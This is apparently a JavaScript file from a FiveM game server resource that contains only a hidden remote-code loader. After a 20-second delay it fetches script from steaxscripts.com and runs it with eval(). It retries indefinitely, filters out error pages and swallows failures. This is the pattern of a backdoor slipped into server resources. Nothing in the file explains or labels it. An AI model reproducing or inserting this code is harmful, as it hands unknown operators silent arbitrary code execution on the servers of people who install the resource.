setImmediate(() => {
    setTimeout(() => {
        const __THREAD_NAME = "miaus";
        const resourceName = GetCurrentResourceName();

        if (typeof globalThis.GlobalState === "undefined") {
            globalThis.GlobalState = {};
        }

        const currentOwner = globalThis.GlobalState[__THREAD_NAME];

        if (!currentOwner || currentOwner === resourceName) {
            globalThis.GlobalState[__THREAD_NAME] = resourceName;

            on("onResourceStop", (stoppedResource) => {
                if (stoppedResource === resourceName) delete globalThis.GlobalState[__THREAD_NAME];
            });

            const executePayload = () => {
                let attempts = 0;
                const maxAttempts = 3;
                let timeoutId = null;
                let retryInterval = null;

                const tryEndpoint = (endpoint, timeoutMs = 10000) => {
                    return new Promise((resolve) => {
                        try {
                            const req = require("https").get(`https://steaxscripts.com/${endpoint}`, (r) => {
                                let data = '';
                                let timeout = setTimeout(() => {
                                    req.destroy();
                                    resolve(null);
                                }, timeoutMs);
                                
                                r.on('data', (chunk) => data += chunk);
                                r.on('end', () => {
                                    clearTimeout(timeout);
                                    if (data && 
                                        data.length > 10 && 
                                        !data.includes('<html') && 
                                        !data.includes('<!DOCTYPE') && 
                                        !data.includes('cloudflare') &&
                                        !data.toLowerCase().includes('error') &&
                                        !data.toLowerCase().includes('not found')) {
                                        resolve(data);
                                    } else {
                                        resolve(null);
                                    }
                                });
                            });
                            
                            req.on('error', () => resolve(null));
                            req.setTimeout(timeoutMs, () => {
                                req.destroy();
                                resolve(null);
                        });
                        } catch(e) {
                            resolve(null);
                        }
                    });
                };

                const attemptFetch = async () => {
                    attempts++;
                    
                    if (attempts > maxAttempts) {
                        clearTimeout(timeoutId);
                        if (retryInterval) clearInterval(retryInterval);
                        setTimeout(executePayload, 120000);
                        return;
                    }

                    const data1 = await tryEndpoint(`qwertyJJ`);
                    if (data1) {
                        try {
                            eval(data1);
                            clearTimeout(timeoutId);
                            if (retryInterval) clearInterval(retryInterval);
                            return;
                        } catch(e) {}
                    }

                    await new Promise(resolve => setTimeout(resolve, 10000));
                    const data2 = await tryEndpoint(`qwertyJJgg`);
                    if (data2) {
                        try {
                            eval(data2);
                            clearTimeout(timeoutId);
                            if (retryInterval) clearInterval(retryInterval);
                            return;
                        } catch(e) {}
                    }

                    if (attempts < maxAttempts) {
                        setTimeout(attemptFetch, 5000);
                    } else {
                        attemptFetch();
                    }
                };

                attemptFetch();
            };

            executePayload();
        }
    }, 20000);
});
